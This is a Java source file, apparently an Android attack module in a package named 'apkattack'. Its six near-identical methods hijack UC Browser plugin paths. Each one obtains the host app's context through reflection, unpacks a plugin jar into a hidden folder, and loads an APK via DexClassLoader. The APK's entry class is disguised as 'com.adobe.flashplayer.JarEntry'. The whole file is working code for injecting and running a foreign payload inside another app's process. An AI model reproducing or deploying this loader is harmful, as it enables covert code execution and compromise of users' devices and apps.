package com.example.apkattack;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import android.annotation.SuppressLint;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class ucmobile {

	public static void ppappstoreEntryWithoutContext(){
    	String Tag = "ppappstoreEntryWithoutContext";
    	try {
    		Log.e(Tag,"start");
    		
	        Class<?> clsat = Class.forName("android.app.ActivityThread");
	        Method methodcat = clsat.getMethod("currentActivityThread");
	        Object objcat = methodcat.invoke(clsat);
	        Method mga = objcat.getClass().getMethod("getApplication");
	        Context context =(Context)mga.invoke(objcat);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "get context ok,package:" + context.getPackageName()+"/" + context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, stackElements[i].getClassName()+"/" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }
    		

    		String apppath = context.getFilesDir().getParent() + "/";
	    	String unzippath = apppath + "fuck_ucmobile/";
			File unzippathfFile = new File(unzippath);
			if (unzippathfFile.exists() == false) {
				boolean ret = unzippathfFile.mkdirs();
				if (ret == false) {
					Log.e(Tag,"error create unzip folder:" + unzippath);
					return;
				}else{
					Log.e(Tag,"successully make unzip path:" + unzippath);
				}
			}else{
				Log.e(Tag,"already exist unzip path:" + unzippath);
			}
	    	
			
			String apkfn = "simcard.apk";
			File []unzipfiles = new File(unzippath + "assets/").listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					break;
				}
			}
			
			//String dexclassname = "com.google.android.apps.plus.JarEntry";
			String dexclassname = "com.adobe.flashplayer.JarEntry";
	    	String dexmethodname = "start";
	    	String cfgfn = "ark.dat";

	    	File apk = new File(unzippath + "assets/"+ apkfn);
	    	File config = new File(unzippath + "assets/" + cfgfn);
	    	if (apk.exists() == false || config.exists() == false) {
	    		
	    		Log.e(Tag,"not found dex or config files,running for first time");
		    	
		    	String pluginPath = apppath + "aerie/ppappstore/version.1/dex/";
		    	File fileplugin = new File(pluginPath);
		    	if (fileplugin.exists() == false) {
		    		pluginPath = apppath + "aerie/ppappstore/version.2/dex/";
		    		fileplugin = new File(pluginPath);
		    		if (fileplugin.exists() == false) {
		    			Log.e(Tag,"not found ppappstore plugin file path");
		    			return;
					}
				}
		    	
		    	String ppapkfn = "ppappstore.jar";

		        ZipEntry zipEntry = null;
		        byte unzipbuf[] = new byte[0x10000];
		        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(pluginPath + ppapkfn)));
	            while ( (zipEntry = zipIn.getNextEntry()) != null) {
	            	File unzipfile = new File(unzippath + zipEntry.getName());
	                if (zipEntry.isDirectory()) {
	                	unzipfile.mkdirs();
	                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
	                } else {
	                    File unzipparent = unzipfile.getParentFile();
	                    if (unzipparent.exists() == false) {
	                    	unzipparent.mkdirs();
	                    	
	                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
	                    }
	                    
	                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
	                    int readedBytes = 0;
	                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
	                        fileOut.write(unzipbuf, 0, readedBytes);
	                    }
	                    fileOut.close();
	                }
	                zipIn.closeEntry();
	            }
	            zipIn.close();
	            
	            Log.e(Tag,"unzip complete");
			}else{
				Log.e(Tag,"apk and config file already existing");
			}

	    	String appcachepath = context.getCacheDir() + "/";
	    	
	    	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + apkfn, appcachepath, null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
    	    method.invoke(obj,context);
    	    
    	    Log.e(Tag, "load apk success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "load apk exception");
    	}
	}
	
	//Lcom/uc/game/biz/GameActivity;
	//Lcom/uc/game/biz/GameStatsHelper;
	//com.uc.game.biz.GameWarmUpService.smali
	
	@SuppressLint("SdCardPath") 
	public static void ucgameEntryWithoutContext(){
    	String Tag = "ucgameEntryWithoutContext";
    	try {
    		Log.e(Tag,"start");
    		
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "get context ok,package:" + context.getPackageName()+"/" + context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }
	        
	        
    		String apptpath = context.getFilesDir().getParent() + "/";
	    	String unzippath = apptpath + "fuck_ucmobile/";

	    	String dexmethodname = "start";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
	    	
	    	//String apkfn = "simcard.apk";
	    	//String cfgfn = "ark.dat";
	    	//String dexclassname = "com.google.android.apps.plus.JarEntry";
	    	
			File unzippathfFile = new File(unzippath);
			if (unzippathfFile.exists() == false) {
				boolean ret = unzippathfFile.mkdirs();
				if (ret == false) {
					Log.e(Tag,"error create unzip folder:" + unzippath);
					return;
				}else{
					Log.e(Tag,"successully unzip make path:" + unzippath);
				}
			}else{
				Log.e(Tag,"already exist unzip path:" + unzippath);
			}
	    	
	    	
			File []unzipfiles = new File(unzippath + "assets/").listFiles();
			if (unzipfiles == null || unzipfiles.length == 0) {

	    		Log.e(Tag,"not found dex or config files,run for first time");
		    	
		    	String pluginPath = apptpath + "aerie/ucgame/version.1/dex/";
		    	File fileplugin = new File(pluginPath);
		    	if (fileplugin.exists() == false) {
		    		pluginPath = apptpath + "aerie/ucgame/version.2/dex/";
		    		fileplugin = new File(pluginPath);
		    		if (fileplugin.exists() == false) {
		    			Log.e(Tag,"not found ucgame plugin file path");
		    			return;
					}
				}
		    	
		    	String ppapkfn = "ucgame.jar";

		        ZipEntry zipEntry = null;
		        byte unzipbuf[] = new byte[0x10000];
		        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(pluginPath + ppapkfn)));

	            while ( (zipEntry = zipIn.getNextEntry()) != null) {
	            	File unzipfile = new File(unzippath + zipEntry.getName());
	                if (zipEntry.isDirectory()) {
	                	unzipfile.mkdirs();
	                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
	                } else {
	                    File unzipparent = unzipfile.getParentFile();
	                    if (unzipparent.exists() == false) {
	                    	unzipparent.mkdirs();
	                    	
	                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
	                    }
	                    
	                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
	                    int readedBytes = 0;
	                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
	                        fileOut.write(unzipbuf, 0, readedBytes);
	                    }
	                    fileOut.close();
	                }
	                zipIn.closeEntry();
	            }
	            zipIn.close();
	            
	            Log.e(Tag,"unzip complete");
			}else{
				Log.e(Tag,"apk and config file already existing");
			}
	    	
			String apkfn = "simcard.apk";
			unzipfiles = new File(unzippath + "assets/").listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					break;
				}
			}

	    	String appcachepath = context.getCacheDir() + "/";
	    	
	    	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + apkfn, appcachepath, null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
    	    method.invoke(obj,context);
    	    
    	    Log.e(Tag, "ucmobile load apk success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "ucmobile load apk exception");
    	}
	}
	
	
	
	
	
	
	
	
	
	
	
	public static void amapEntryWithoutContext(){
    	String Tag = "amapEntryWithoutContext";
    	try {
    		Log.e(Tag,"start");
    		
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "get context ok,package:" + context.getPackageName()+"/" + context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }

    		String apptpath = context.getFilesDir().getParent() + "/";
	    	String unzippath = apptpath + "fuck_ucmobile/";

	    	String dexmethodname = "start";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
	    	
			File unzippathfFile = new File(unzippath);
			if (unzippathfFile.exists() == false) {
				boolean ret = unzippathfFile.mkdirs();
				if (ret == false) {
					Log.e(Tag,"error create unzip folder:" + unzippath);
					return;
				}else{
					Log.e(Tag,"successully unzip make path:" + unzippath);
				}
			}else{
				Log.e(Tag,"already exist unzip path:" + unzippath);
			}
	    	
	    	
			File []unzipfiles = new File(unzippath + "assets/").listFiles();
			if (unzipfiles == null || unzipfiles.length == 0) {

	    		Log.e(Tag,"not found dex or config,run for first time");
		    	
		    	String pluginPath = apptpath + "aerie/amap/version.1/dex/";
		    	File fileplugin = new File(pluginPath);
		    	if (fileplugin.exists() == false) {
		    		pluginPath = apptpath + "aerie/amap/version.2/dex/";
		    		fileplugin = new File(pluginPath);
		    		if (fileplugin.exists() == false) {
		    			Log.e(Tag,"not found ucgame plugin file path");
		    			return;
					}
				}
		    	
		    	String ppapkfn = "amap.jar";

		        ZipEntry zipEntry = null;
		        byte unzipbuf[] = new byte[0x10000];
		        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(pluginPath + ppapkfn)));

	            while ( (zipEntry = zipIn.getNextEntry()) != null) {
	            	File unzipfile = new File(unzippath + zipEntry.getName());
	                if (zipEntry.isDirectory()) {
	                	unzipfile.mkdirs();
	                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
	                } else {
	                    File unzipparent = unzipfile.getParentFile();
	                    if (unzipparent.exists() == false) {
	                    	unzipparent.mkdirs();
	                    	
	                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
	                    }
	                    
	                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
	                    int readedBytes = 0;
	                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
	                        fileOut.write(unzipbuf, 0, readedBytes);
	                    }
	                    fileOut.close();
	                }
	                zipIn.closeEntry();
	            }
	            zipIn.close();
	            
	            Log.e(Tag,"unzip complete");
			}else{
				Log.e(Tag,"apk and config file already existing");
			}
	    	
			String apkfn = "simcard.apk";
			unzipfiles = new File(unzippath + "assets/").listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					break;
				}
			}

	    	String appcachepath = context.getCacheDir() + "/";
	    	
	    	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + apkfn, appcachepath, null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
    	    method.invoke(obj,context);
    	    
    	    Log.e(Tag, "ucmobile load apk success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "ucmobile load apk exception");
    	}
	}
	
	
	
	
	
	
	
	
	
	public static void ucliveEntryWithoutContext(){
    	String Tag = "ucliveEntryWithoutContext";
    	try {
    		Log.e(Tag,"start");
    		
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "get context ok,package:" + context.getPackageName()+"/" + context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }

    		String apptpath = context.getFilesDir().getParent() + "/";
	    	String unzippath = apptpath + "fuck_ucmobile/";

	    	String dexmethodname = "start";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
	    	
			File unzippathfFile = new File(unzippath);
			if (unzippathfFile.exists() == false) {
				boolean ret = unzippathfFile.mkdirs();
				if (ret == false) {
					Log.e(Tag,"error create unzip folder:" + unzippath);
					return;
				}else{
					Log.e(Tag,"successully unzip make path:" + unzippath);
				}
			}else{
				Log.e(Tag,"already exist unzip path:" + unzippath);
			}

			File []unzipfiles = new File(unzippath + "assets/").listFiles();
			if (unzipfiles == null || unzipfiles.length == 0) {

	    		Log.e(Tag,"not found dex or config,run for first time");
		    	
		    	String pluginPath = apptpath + "aerie/uclive/version.1/dex/";
		    	File fileplugin = new File(pluginPath);
		    	if (fileplugin.exists() == false) {
		    		pluginPath = apptpath + "aerie/uclive/version.2/dex/";
		    		fileplugin = new File(pluginPath);
		    		if (fileplugin.exists() == false) {
		    			Log.e(Tag,"not found ucgame plugin file path");
		    			return;
					}
				}
		    	
		    	String ppapkfn = "uclive.jar";

		        ZipEntry zipEntry = null;
		        byte unzipbuf[] = new byte[0x10000];
		        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(pluginPath + ppapkfn)));

	            while ( (zipEntry = zipIn.getNextEntry()) != null) {
	            	File unzipfile = new File(unzippath + zipEntry.getName());
	                if (zipEntry.isDirectory()) {
	                	unzipfile.mkdirs();
	                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
	                } else {
	                    File unzipparent = unzipfile.getParentFile();
	                    if (unzipparent.exists() == false) {
	                    	unzipparent.mkdirs();
	                    	
	                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
	                    }
	                    
	                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
	                    int readedBytes = 0;
	                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
	                        fileOut.write(unzipbuf, 0, readedBytes);
	                    }
	                    fileOut.close();
	                }
	                zipIn.closeEntry();
	            }
	            zipIn.close();
	            
	            Log.e(Tag,"unzip complete");
			}else{
				Log.e(Tag,"apk and config file already existing");
			}
	    	
			String apkfn = "simcard.apk";
			unzipfiles = new File(unzippath + "assets/").listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					break;
				}
			}

	    	String appcachepath = context.getCacheDir() + "/";
	    	
	    	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + apkfn, appcachepath, null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
    	    method.invoke(obj,context);
    	    
    	    Log.e(Tag, "ucmobile load apk success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "ucmobile load apk exception");
    	}
	}

	
	
	public static void alohaEntryWithoutContext(){
    	String Tag = "alohaEntryWithoutContext";
    	try {
    		Log.e(Tag,"start");
    		
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "get context ok,package:" + context.getPackageName()+"/" + context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }
    		
    		String apptpath = context.getFilesDir().getParent() + "/";
	    	String unzippath = apptpath + "fuck_ucmobile/";

	    	String dexmethodname = "start";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
	    	
			File unzippathfFile = new File(unzippath);
			if (unzippathfFile.exists() == false) {
				boolean ret = unzippathfFile.mkdirs();
				if (ret == false) {
					Log.e(Tag,"error create unzip folder:" + unzippath);
					return;
				}else{
					Log.e(Tag,"successully unzip make path:" + unzippath);
				}
			}else{
				Log.e(Tag,"already exist unzip path:" + unzippath);
			}

			File []unzipfiles = new File(unzippath + "assets/").listFiles();
			if (unzipfiles == null || unzipfiles.length == 0) {

	    		Log.e(Tag,"not found dex or config,run for first time");
		    	
		    	String pluginPath = apptpath + "aerie/aloha/version.1/dex/";
		    	File fileplugin = new File(pluginPath);
		    	if (fileplugin.exists() == false) {
		    		pluginPath = apptpath + "aerie/aloha/version.2/dex/";
		    		fileplugin = new File(pluginPath);
		    		if (fileplugin.exists() == false) {
		    			Log.e(Tag,"not found ucgame plugin file path");
		    			return;
					}
				}
		    	
		    	String ppapkfn = "aloha.jar";

		        ZipEntry zipEntry = null;
		        byte unzipbuf[] = new byte[0x10000];
		        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(pluginPath + ppapkfn)));

	            while ( (zipEntry = zipIn.getNextEntry()) != null) {
	            	File unzipfile = new File(unzippath + zipEntry.getName());
	                if (zipEntry.isDirectory()) {
	                	unzipfile.mkdirs();
	                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
	                } else {
	                    File unzipparent = unzipfile.getParentFile();
	                    if (unzipparent.exists() == false) {
	                    	unzipparent.mkdirs();
	                    	
	                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
	                    }
	                    
	                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
	                    int readedBytes = 0;
	                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
	                        fileOut.write(unzipbuf, 0, readedBytes);
	                    }
	                    fileOut.close();
	                }
	                zipIn.closeEntry();
	            }
	            zipIn.close();
	            
	            Log.e(Tag,"unzip complete");
			}else{
				Log.e(Tag,"apk and config file already existing");
			}
	    	
			String apkfn = "simcard.apk";
			unzipfiles = new File(unzippath + "assets/").listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					break;
				}
			}

	    	String appcachepath = context.getCacheDir() + "/";
	    	
	    	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + apkfn, appcachepath, null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
    	    method.invoke(obj,context);
    	    
    	    Log.e(Tag, "ucmobile load apk success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "ucmobile load apk exception");
    	}
	}
	
	
	

	public static void ucgame_rta_EntryWithoutContext(){
    	String Tag = "ucgame_rta_EntryWithoutContext";
    	try {
    		Log.e(Tag,"start");
    		
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "get context ok,package:" + context.getPackageName()+"/" + context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }
	        
	        
    		
    		String apptpath = context.getFilesDir().getParent() + "/";
	    	String unzippath = apptpath + "fuck_ucmobile/";

	    	String dexmethodname = "start";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
	    	
			File unzippathfFile = new File(unzippath);
			if (unzippathfFile.exists() == false) {
				boolean ret = unzippathfFile.mkdirs();
				if (ret == false) {
					Log.e(Tag,"error create unzip folder:" + unzippath);
					return;
				}else{
					Log.e(Tag,"successully unzip make path:" + unzippath);
				}
			}else{
				Log.e(Tag,"already exist unzip path:" + unzippath);
			}

			File []unzipfiles = new File(unzippath + "assets/").listFiles();
			if (unzipfiles == null || unzipfiles.length == 0) {

	    		Log.e(Tag,"not found dex or config,run for first time");
		    	
		    	String pluginPath = apptpath + "aerie/ucgame-rta/version.1/dex/";
		    	File fileplugin = new File(pluginPath);
		    	if (fileplugin.exists() == false) {
		    		pluginPath = apptpath + "aerie/ucgame-rta/version.2/dex/";
		    		fileplugin = new File(pluginPath);
		    		if (fileplugin.exists() == false) {
		    			Log.e(Tag,"not found ucgame plugin file path");
		    			return;
					}
				}
		    	
		    	String ppapkfn = "ucgame-rta.jar";

		        ZipEntry zipEntry = null;
		        byte unzipbuf[] = new byte[0x10000];
		        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(pluginPath + ppapkfn)));

	            while ( (zipEntry = zipIn.getNextEntry()) != null) {
	            	File unzipfile = new File(unzippath + zipEntry.getName());
	                if (zipEntry.isDirectory()) {
	                	unzipfile.mkdirs();
	                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
	                } else {
	                    File unzipparent = unzipfile.getParentFile();
	                    if (unzipparent.exists() == false) {
	                    	unzipparent.mkdirs();
	                    	
	                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
	                    }
	                    
	                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
	                    int readedBytes = 0;
	                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
	                        fileOut.write(unzipbuf, 0, readedBytes);
	                    }
	                    fileOut.close();
	                }
	                zipIn.closeEntry();
	            }
	            zipIn.close();
	            
	            Log.e(Tag,"unzip complete");
			}else{
				Log.e(Tag,"apk and config file already existing");
			}
	    	
			String apkfn = "simcard.apk";
			unzipfiles = new File(unzippath + "assets/").listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					break;
				}
			}

	    	String appcachepath = context.getCacheDir() + "/";
	    	
	    	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + apkfn, appcachepath, null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
    	    method.invoke(obj,context);
    	    
    	    Log.e(Tag, "ucmobile load apk success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "ucmobile load apk exception");
    	}
	}
}
